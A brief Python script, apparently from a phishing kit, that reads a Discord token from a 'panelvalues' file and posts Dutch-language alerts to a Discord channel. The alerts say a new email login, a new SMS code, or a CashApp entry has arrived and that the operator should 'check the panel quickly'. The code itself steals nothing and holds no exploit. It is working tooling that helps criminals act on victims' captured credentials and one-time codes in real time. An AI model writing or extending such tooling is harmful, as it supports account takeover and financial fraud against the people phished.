import time

import requests

asda = "neef"
f = open("panelvalues/discordauth", "r")
auth = f.read()

GOON = {
    "content" : "NIEUWE INLOG MET EMAIL, KIJK SNEL PANEEEL"
}
SMS = {
    "content" : "NIEUWE SMS CODE, KIJK SNEL PANEEEL"
}
cash = {
    "content" : "CASHAPP GOON"
}

header = {
    'authorization': auth
}

r = requests.post("https://discord.com/api/v9/channels/938168006851317780/messages", data={"content" : "NIEUWE SMS CODE, KIJK SNEL "+asda}, headers=header)

